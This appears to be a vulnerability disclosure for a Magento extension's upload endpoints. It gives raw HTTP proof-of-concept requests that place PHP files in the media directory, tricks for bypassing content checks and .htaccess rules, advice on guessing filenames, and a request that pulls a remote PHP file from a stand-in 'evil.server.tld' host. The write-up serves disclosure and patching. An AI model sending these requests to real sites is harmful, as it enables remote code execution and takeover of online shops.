# Upload any file to the server

The extension contains several endpoints to allow file uploads. Uploaded files are placed in various subfolders inside Magento's `media/` directory.
By default, Magento places an `.htaccess` file in this directory to prevent code execution in `.php` and other common filetypes.
However, based on server configuration, it is possible that some executable extensions are not blocked and can be leveraged for code execution.
Moreover, some of these endpoints trust the client-provided filename, which means you can upload another `.htaccess` file to counteract those restrictions.

## Endpoint 1

### Request:
```
POST https://testing.local.tld/pdp/index/uploadFont/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="file"; filename="something.ttf.php"
Content-Type: application/octet-stream

<?php

phpinfo();

---------------------------acebdf13572468--
```

### Response
Usually empty, may raise an error with certain file extensions.

The uploaded file is placed in Magento's `media/pdp/fonts/` directory.
Its name is is the same as given in the request.

If the second token of the provided filename, when split on dot, is a valid font type,
and a font with this name is not registered in the system,
the new font name will be inserted into the db as a new valid font.
Otherwise, an error will be raised, but the uploaded file will already be in the target directory.

--- 

## Endpoint 2

### Request:
```
POST https://testing.local.tld/pdp/index/saveBase64Image/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="base_code_image"

data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
---------------------------acebdf13572468
Content-Disposition: form-data; name="format"

php
---------------------------acebdf13572468--
```

### Response body (JSON)
```
{"status":"success","message":"Image have been successfully saved!","thumbnail_path":"https:\/\/testing.local.tld\/media\/pdp\/images\/thumbnail\/thumbnail_image_1479931179.php","filename":"thumbnail_image_1479931179.php"}
```

The uploaded file is placed in Magento's `media/pdp/images/thumbnail/` directory.  
The file's generated filename is returned in the response body.  
The file extension is taken from the `format` parameter without sanitization.

---

## Endpoint 3

### Request:
```
POST https://testing.local.tld/pdp/upload/uploadCustomImage/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="uploads[0]"; filename="somes.ttf.php"
Content-Type: image/svg+xml

<?php

phpinfo();

---------------------------acebdf13572468--
```

Response body (JSON)
```
["https:\/\/testing.local.tld\/media\/pdp\/images\/upload\/1479934682-customupload.php"]
```

The uploaded file is placed in Magento's `media/pdp/images/upload/` directory.  
The file's generated filename is returned in the response body.  
The file's original extension (last split-on-dot token) is trusted as the output extension.  
The file's Content-Type must be specified as image/svg+xml to bypass file content checks.

Files with unsupported Content-Type will still be uploaded, even though the response will be an error.
In this case, the generated filename will have to be guessed.   
Guessing should not be difficult, as the generated filenames follow the `%d-customupload.%s` pattern, 
using the current UNIX timestamp as the prefix without any collision prevention.  

---

## Endpoint 4

### Request:
```
POST https://testing.local.tld/pdp/upload/uploadImage/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="filename"; filename="somes.ttf.php"
Content-Type: text/plain

<?php

phpinfo();

---------------------------acebdf13572468--
```

Response body (JSON)
```
["https:\/\/testing.local.tld\/media\/pdp\/images\/upload\/1479934682-customupload.php"]
```

The uploaded file is placed in Magento's `media/pdp/images/upload/` directory.  
The file's generated filename is returned in the response body.
The file's original extension (last split-on-dot token) is trusted as the output extension.  
The file's Content-Type is ignored.

Files that don't pass image type checks will still be uploaded, even though the response will be an error.
In this case, the generated filename will have to be guessed.   
Generated filenames follow the `%d-%s-custom.%s` pattern, 
using the current UNIX timestamp and uniqid() as prefixes, which makes the filenames harder to predict.  

---

## Endpoint 5

### Request:
```
POST https://testing.local.tld/pdp/upload/copyImageFromUrl/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="url"

http://evil.server.tld/misc/what.php
---------------------------acebdf13572468
Content-Disposition: form-data; name="product_id"

0
---------------------------acebdf13572468--
```

Response body (JSON)
```
{"status":"success","message":"Image had copied successfully!","filename":"https:\/\/testing.local.tld\/media\/pdp\/images\/upload\/social-image-1479935623.php","original_filename":"http:\/\/evil.server.tld\/misc\/what.php","price":0,"price_format":"Free"}
```

The file is downloaded from the given URL and placed in Magento's `media/pdp/images/upload/` directory without any content checking.  
The file's generated filename is returned in the response body.  
The file's extension (last split-on-dot token) is trusted as the output extension.

---

## Endpoint 6

### Request:
```
POST https://testing.local.tld/pdp/export/saveExportImage/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="base_code_image"

data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
---------------------------acebdf13572468
Content-Disposition: form-data; name="format"

php
---------------------------acebdf13572468--
```

### Response body (JSON)
```
{"status":"success","message":"Image have been successfully saved!","filename":"Design_58360a038adf4.php","thumbnail_path":"https:\/\/testing.local.tld\/media\/pdp\/images\/thumbnail\/Design_58360a038adf4.php"}
```
The uploaded file is placed in Magento's `media/pdp/download/` directory.  
The file's generated filename is returned in the response body, but its path incorrectly points to `media/pdp/images/thumbnail/` rather than `media/download/`.  
The file's extension (last split-on-dot token) is trusted as the output extension.

---

## Endpoint 7

### Request:
```
POST https://testing.local.tld/pdp/index/uploadCustomImage/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="uploads[0]"; filename="some.php"
Content-Type: text/plain

<?php

phpinfo();

---------------------------acebdf13572468--
```

Response body (JSON)
```
["https:\/\/testing.local.tld\/media\/pdp\/images\/upload\/1479934682-customupload.php"]
```

The uploaded file is placed in Magento's `media/pdp/images/upload/` directory.  
The file's generated filename is returned in the response body.  
The file's original extension (last split-on-dot token) is trusted as the output extension.  
The file's Content-Type is ignored.
